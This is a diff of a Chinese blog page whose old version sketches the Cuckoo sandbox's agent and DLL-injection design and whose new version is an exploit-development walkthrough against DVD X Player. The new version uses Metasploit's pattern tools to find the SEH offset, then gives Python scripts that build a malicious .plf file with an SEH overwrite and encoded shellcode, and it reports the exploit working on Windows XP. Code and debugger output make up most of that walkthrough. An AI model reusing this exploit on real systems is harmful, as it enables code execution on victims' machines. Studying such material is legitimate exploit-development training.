@@ -1,36 +1,163 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zh-cn">
 <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
-<title>Cuckoo&#x67B6;&#x6784;</title>
-<body><p>cuckoo在部署阶段，只在Guest系统里塞了一个agent，这个agent在运行阶段负责与Host端程序进行通信，从Host端接收sample, 整个客户端程序，以及配置文件。</p> <p>&nbsp;</p> <p>在Host端主要的源文件为：</p> <div class="cnblogs_Highlighter"><pre class="brush:cpp;gutter:true;">./lib/cuckoo/core/scheduler.py
-</pre></div>
-<div class="cnblogs_Highlighter">
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre><span style="color: #0000ff">class</span> AnalysisManager(Thread):</pre><!--CRLF--><pre>    def acquire_machine(self):</pre><!--CRLF--><pre><span style="color: #008000">// 获得虚拟机    </span></pre><!--CRLF--><pre>    def build_options(self):</pre><!--CRLF--><pre><span style="color: #008000">//生成.conf配置文件</span></pre><!--CRLF--><pre>    def launch_analysis(self):</pre><!--CRLF--><pre><span style="color: #008000">//启动分析过程</span></pre><!--CRLF--><pre>    def process_results(self):</pre><!--CRLF--><pre><span style="color: #008000">//生成分析结果报告</span></pre><!--CRLF--></div></div></div>
+<title>find pattern</title>
+<body><div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">daniel@daniel-mint ~/msf/metasploit-framework/tools $ ruby pattern_create.rb 2000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
+</pre>
+</div>
+<p>生成定位pattern</p>
 <p>&nbsp;</p>
-<p>launch_analysis会调用：</p>
+<p>根据pattern查找位置</p>
 <div class="cnblogs_Highlighter">
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre>agent/agent.py</pre><!--CRLF--><pre>    def add_malware(self, data, name):</pre><!--CRLF--><pre>    def add_config(self, options):</pre><!--CRLF--><pre>    def add_analyzer(self, data):</pre><!--CRLF--><pre>    def execute(self):</pre><!--CRLF--></div></div></div>
+<pre class="brush:csharp;gutter:true;">0:000&gt; db poi(fs:0)
+0012f2c8  32 41 75 33 41 75 34 41-75 35 41 75 36 41 75 37  2Au3Au4Au5Au6Au7
+0012f2d8  41 75 38 41 75 39 41 76-30 41 76 31 41 76 32 41  Au8Au9Av0Av1Av2A
+0012f2e8  76 33 41 76 34 41 76 35-41 76 36 41 76 37 41 76  v3Av4Av5Av6Av7Av
+0012f2f8  38 41 76 39 41 77 30 41-77 31 41 77 32 41 77 33  8Av9Aw0Aw1Aw2Aw3
+0012f308  41 77 34 41 77 35 41 77-36 41 77 37 41 77 38 41  Aw4Aw5Aw6Aw7Aw8A
+0012f318  77 39 41 78 30 41 78 31-41 78 32 41 78 33 41 78  w9Ax0Ax1Ax2Ax3Ax
+0012f328  34 41 78 35 41 78 36 41-78 37 41 78 38 41 78 39  4Ax5Ax6Ax7Ax8Ax9
+0012f338  41 79 30 41 79 31 41 79-32 41 79 33 41 79 34 41  Ay0Ay1Ay2Ay3Ay4A
+</pre>
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">Prelude&gt; zip [1..100] ['a'..'z']
+[(1,'a'),(2,'b'),(3,'c'),(4,'d'),(5,'e'),(6,'f'),(7,'g'),(8,'h'),(9,'i'),(10,'j'),(11,'k'),(12,'l'),(13,'m'),(14,'n'),(15,'o'),(16,'p'),(17,'q'),(18,'r'),(19,'s'),(20,'t'),(21,'u'),(22,'v'),(23,'w'),(24,'x'),(25,'y'),(26,'z')]
+</pre>
+</div>
+<p>　　</p>
+<p>因此Au3-Aa0 = [u-a] * 10 + [3 - 0 ] = (21 - 1) * 10 + 3 = 203，即Au3是第203个三元组</p>
+<p>所以2Au3是在203*3 = 609偏移处</p>
 <p>&nbsp;</p>
-<p>执行analyser.py，由Host上传到Guest上的分析程序包含如下结构：</p>
+<p>或者</p>
+<p>At9-Aa0 = [t - a + 1] * 10 = 200组，占据了600个字节，</p>
+<p>Au0Au1Au2Au3</p>
 <div class="cnblogs_Highlighter">
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre>.</pre><!--CRLF--><pre>└── windows</pre><!--CRLF--><pre>    ├── analyzer.py</pre><!--CRLF--><pre>    ├── bin</pre><!--CRLF--><pre>    │   └── execsc.exe</pre><!--CRLF--><pre>    ├── dll</pre><!--CRLF--><pre>    │   ├── cuckoomon_bson.dll</pre><!--CRLF--><pre>    │   ├── cuckoomon.dll</pre><!--CRLF--><pre>    │   └── cuckoomon_netlog.dll</pre><!--CRLF--><pre>    ├── lib</pre><!--CRLF--><pre>    │   ├── api</pre><!--CRLF--><pre>    │   │   ├── __init__.py</pre><!--CRLF--><pre>    │   │   ├── process.py</pre><!--CRLF--><pre>    │   │   └── screenshot.py</pre><!--CRLF--><pre>    │   ├── common</pre><!--CRLF--><pre>    │   │   ├── abstracts.py</pre><!--CRLF--><pre>    │   │   ├── constants.py</pre><!--CRLF--><pre>    │   │   ├── defines.py</pre><!--CRLF--><pre>    │   │   ├── errors.py</pre><!--CRLF--><pre>    │   │   ├── exceptions.py</pre><!--CRLF--><pre>    │   │   ├── __init__.py</pre><!--CRLF--><pre>    │   │   ├── rand.py</pre><!--CRLF--><pre>    │   │   └── results.py</pre><!--CRLF--><pre>    │   ├── core</pre><!--CRLF--><pre>    │   │   ├── config.py</pre><!--CRLF--><pre>    │   │   ├── __init__.py</pre><!--CRLF--><pre>    │   │   ├── packages.py</pre><!--CRLF--><pre>    │   │   ├── privileges.py</pre><!--CRLF--><pre>    │   │   └── startup.py</pre><!--CRLF--><pre>    │   └── __init__.py</pre><!--CRLF--><pre>    └── modules</pre><!--CRLF--><pre>        ├── auxiliary</pre><!--CRLF--><pre>        │   ├── disguise.py</pre><!--CRLF--><pre>        │   ├── human.py</pre><!--CRLF--><pre>        │   ├── __init__.py</pre><!--CRLF--><pre>        │   └── screenshots.py</pre><!--CRLF--><pre>        ├── __init__.py</pre><!--CRLF--><pre>        └── packages</pre><!--CRLF--><pre>            ├── applet.py</pre><!--CRLF--><pre>            ├── bin.py</pre><!--CRLF--><pre>            ├── cpl.py</pre><!--CRLF--><pre>            ├── dll.py</pre><!--CRLF--><pre>            ├── doc.py</pre><!--CRLF--><pre>            ├── exe.py</pre><!--CRLF--><pre>            ├── generic.py</pre><!--CRLF--><pre>            ├── html.py</pre><!--CRLF--><pre>            ├── ie.py</pre><!--CRLF--><pre>            ├── __init__.py</pre><!--CRLF--><pre>            ├── jar.py</pre><!--CRLF--><pre>            ├── pdf.py</pre><!--CRLF--><pre>            ├── vbs.py</pre><!--CRLF--><pre>            ├── xls.py</pre><!--CRLF--><pre>            └── zip.py</pre><!--CRLF--></div></div></div>
-<p>具体的inject方法在该包的api/process.py下面</p>
+<pre class="brush:csharp;gutter:true;">Prelude&gt; zip [601..700] ['A','u','0','A','u','1','A','u','2','A','u','3']
+[(601,'A'),(602,'u'),(603,'0'),(604,'A'),(605,'u'),(606,'1'),(607,'A'),(608,'u'),(609,'2'),(610,'A'),(611,'u'),(612,'3')]
+</pre>
+</div>
+<p>　　</p>
+<p>因此是609偏移，或者说占据了609-612这四个字节。</p>
+<p>&nbsp;参考：<a href="http://www.fuzzysecurity.com/tutorials/expDev/3.html">http://www.fuzzysecurity.com/tutorials/expDev/3.html</a></p>
 <div class="cnblogs_Highlighter">
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre>def inject(self, dll=None, apc=False):</pre><!--CRLF--></div></div></div>
-<p>inject方法支持两种注入方式：</p>
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre>QueueUserAPC</pre><!--CRLF--><pre>CreateRemoteThread</pre><!--CRLF--></div></div>
-<p>这两种方式的原理都是一样的，都是用LoadLibrary来替换回调函数，同时将需要加载的dll名称作为回调的参数传递给回调函数，这样回调函数一执行，相应的dll就被加载到了进行的地址空间中。</p>
+<p>filename="evil.plf"<br /> <br />buffer = "A"*608 + "B"*4 + "C"*4 + "D"*(2000 - 608 - 8 - 8)<br />  <br />textfile = open(filename , 'w')<br />textfile.write(buffer)<br />textfile.close()</p>
+
+
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">0:000&gt; dd poi(fs:0)
+0012f2c8  42424242 43434343 44444444 44444444
+0012f2d8  44444444 44444444 44444444 44444444
+0012f2e8  44444444 44444444 44444444 44444444
+0012f2f8  44444444 44444444 44444444 44444444
+0012f308  44444444 44444444 44444444 44444444
+0012f318  44444444 44444444 44444444 44444444
+0012f328  44444444 44444444 44444444 44444444
+0012f338  44444444 44444444 44444444 44444444
+</pre>
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">filename="evil1.plf"
+ 
+buf = "A"*608 + "\xeb\x06\x90\x90" + "\xb6\xf7\x47\x00"
+buf += "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
+buf += "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+buf += "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
+buf += "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"
+buf += "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"
+buf += "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"
+buf += "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"
+buf += "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"
+buf += "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+buf += "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
+buf += "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
+buf += "\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b"
+buf += "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd"
+buf += "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+buf += "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
+buf += "\x2e\x65\x78\x65\x00"
+buf += "D"*(2000 - 608 - 8 - 8 - 200)
+
+  
+textfile = open(filename , 'w')
+textfile.write(buf)
+textfile.close()
+</pre>
+</div>
+<p>　　</p>
+<p>这种方式，并没有exploit成功，原因是shellcode中不能有\x00，这会使字符串截止，而且msfpayload生成的payload中也包含\x00，也无法使用。</p>
 <p>&nbsp;</p>
-<p>在./analyser/windows/modules/packages/下面有对于各个文件格式的sample的启动代码，基本上都是：</p>
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre>p = Process()</pre><!--CRLF--><pre>p.execute()</pre><!--CRLF--><pre>p.inject(dll)</pre><!--CRLF--><pre>p.resume()</pre><!--CRLF--><pre>p.close()</pre><!--CRLF--></div></div>
-<p>基本上就是，先找到启动某一类型文件的程序，然后启动它，并且注入dll进行监控。</p>
-<p>对于shellcode，使用execsc.exe执行这段shellcode。</p>
-<p>execsc.exe的主要源码为：</p>
-<div style="border-bottom: silver 1px solid; text-align: left; border-left: silver 1px solid; padding-bottom: 4px; line-height: 12pt; background-color: #f4f4f4; margin: 20px 0px 10px; padding-left: 4px; width: 97.5%; padding-right: 4px; font-family: 'Courier New', courier, monospace; direction: ltr; max-height: 200px; font-size: 8pt; overflow: auto; border-top: silver 1px solid; cursor: text; border-right: silver 1px solid; padding-top: 4px" id="codeSnippetWrapper">
-<div style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px" id="codeSnippet"><pre style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: white; margin: 0em; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px"><span style="color: #008000">// jump into shellcode</span></pre><!--CRLF--><pre style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; margin: 0em; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px"><span style="color: #0000ff">int</span> (*func)();</pre><!--CRLF--><pre style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: white; margin: 0em; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px">func = (<span style="color: #0000ff">int</span> (*)()) buf;</pre><!--CRLF--><pre style="border-bottom-style: none; text-align: left; padding-bottom: 0px; line-height: 12pt; border-right-style: none; background-color: #f4f4f4; margin: 0em; padding-left: 0px; width: 100%; padding-right: 0px; font-family: 'Courier New', courier, monospace; direction: ltr; border-top-style: none; color: black; font-size: 8pt; border-left-style: none; overflow: visible; padding-top: 0px">(<span style="color: #0000ff">int</span>)(*func)();</pre><!--CRLF--></div></div></body>
+<p>因此需要使用msfencode进行加密，</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">daniel@daniel-mint ~/msf/metasploit-framework $ ruby msfpayload windows/exec CMD=calc.exe R | ruby msfencode -b '\x00\x0d\x0a\x1a' -t python -e x86/call4_dword_xor 
+WARNING: Nokogiri was built against LibXML version 2.8.0, but has dynamically loaded 2.9.1WARNING: Nokogiri was built against LibXML version 2.8.0, but has dynamically loaded 2.9.1
+
+[*] x86/call4_dword_xor succeeded with size 224 (iteration=1)
+
+buf =  ""
+buf += "\x2b\xc9\x83\xe9\xce\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+buf += "\x76\x0e\xdc\x84\x22\x40\x83\xee\xfc\xe2\xf4\x20\x6c"
+buf += "\xab\x40\xdc\x84\x42\xc9\x39\xb5\xf0\x24\x57\xd6\x12"
+buf += "\xcb\x8e\x88\xa9\x12\xc8\x0f\x50\x68\xd3\x33\x68\x66"
+buf += "\xed\x7b\x13\x80\x70\xb8\x43\x3c\xde\xa8\x02\x81\x13"
+buf += "\x89\x23\x87\x3e\x74\x70\x17\x57\xd6\x32\xcb\x9e\xb8"
+buf += "\x23\x90\x57\xc4\x5a\xc5\x1c\xf0\x68\x41\x0c\xd4\xa9"
+buf += "\x08\xc4\x0f\x7a\x60\xdd\x57\xc1\x7c\x95\x0f\x16\xcb"
+buf += "\xdd\x52\x13\xbf\xed\x44\x8e\x81\x13\x89\x23\x87\xe4"
+buf += "\x64\x57\xb4\xdf\xf9\xda\x7b\xa1\xa0\x57\xa2\x84\x0f"
+buf += "\x7a\x64\xdd\x57\x44\xcb\xd0\xcf\xa9\x18\xc0\x85\xf1"
+buf += "\xcb\xd8\x0f\x23\x90\x55\xc0\x06\x64\x87\xdf\x43\x19"
+buf += "\x86\xd5\xdd\xa0\x84\xdb\x78\xcb\xce\x6f\xa4\x1d\xb6"
+buf += "\x85\xaf\xc5\x65\x84\x22\x40\x8c\xec\x13\xcb\xb3\x03"
+buf += "\xdd\x95\x67\x74\x97\xe2\x8a\xec\x84\xd5\x61\x19\xdd"
+buf += "\x95\xe0\x82\x5e\x4a\x5c\x7f\xc2\x35\xd9\x3f\x65\x53"
+buf += "\xae\xeb\x48\x40\x8f\x7b\xf7\x23\xbd\xe8\x41\x6e\xb9"
+buf += "\xfc\x47\x40"
+</pre>
+</div>
+<p>　　</p>
+<p>然后写入shellcode</p>
+<p>&nbsp;</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">filename="evil1.plf"
+ 
+buf = "A"*608 + "\xeb\x06\x90\x90" + "\xed\x7a\x03\x64"
+buf += "\x90"*20
+buf += "\x2b\xc9\x83\xe9\xce\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+buf += "\x76\x0e\xdc\x84\x22\x40\x83\xee\xfc\xe2\xf4\x20\x6c"
+buf += "\xab\x40\xdc\x84\x42\xc9\x39\xb5\xf0\x24\x57\xd6\x12"
+buf += "\xcb\x8e\x88\xa9\x12\xc8\x0f\x50\x68\xd3\x33\x68\x66"
+buf += "\xed\x7b\x13\x80\x70\xb8\x43\x3c\xde\xa8\x02\x81\x13"
+buf += "\x89\x23\x87\x3e\x74\x70\x17\x57\xd6\x32\xcb\x9e\xb8"
+buf += "\x23\x90\x57\xc4\x5a\xc5\x1c\xf0\x68\x41\x0c\xd4\xa9"
+buf += "\x08\xc4\x0f\x7a\x60\xdd\x57\xc1\x7c\x95\x0f\x16\xcb"
+buf += "\xdd\x52\x13\xbf\xed\x44\x8e\x81\x13\x89\x23\x87\xe4"
+buf += "\x64\x57\xb4\xdf\xf9\xda\x7b\xa1\xa0\x57\xa2\x84\x0f"
+buf += "\x7a\x64\xdd\x57\x44\xcb\xd0\xcf\xa9\x18\xc0\x85\xf1"
+buf += "\xcb\xd8\x0f\x23\x90\x55\xc0\x06\x64\x87\xdf\x43\x19"
+buf += "\x86\xd5\xdd\xa0\x84\xdb\x78\xcb\xce\x6f\xa4\x1d\xb6"
+buf += "\x85\xaf\xc5\x65\x84\x22\x40\x8c\xec\x13\xcb\xb3\x03"
+buf += "\xdd\x95\x67\x74\x97\xe2\x8a\xec\x84\xd5\x61\x19\xdd"
+buf += "\x95\xe0\x82\x5e\x4a\x5c\x7f\xc2\x35\xd9\x3f\x65\x53"
+buf += "\xae\xeb\x48\x40\x8f\x7b\xf7\x23\xbd\xe8\x41\x6e\xb9"
+buf += "\xfc\x47\x40"
+buf += "D"*(2000 - 608 - 8 - 8 - 224-20)
+
+  
+textfile = open(filename , 'w')
+textfile.write(buf)
+textfile.close()
+</pre>
+</div>
+<p>　　</p>
+<p>&nbsp;用下面平台测试，exploit成功。</p>
+<blockquote>
+<p>Exploit Development: Backtrack 5<br />Debugging Machine: Windows XP PRO SP3<br />Vulnerable Software:&nbsp;<a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe">Download</a></p>
+</blockquote>
+<p>&nbsp;</p></body>
 </html>
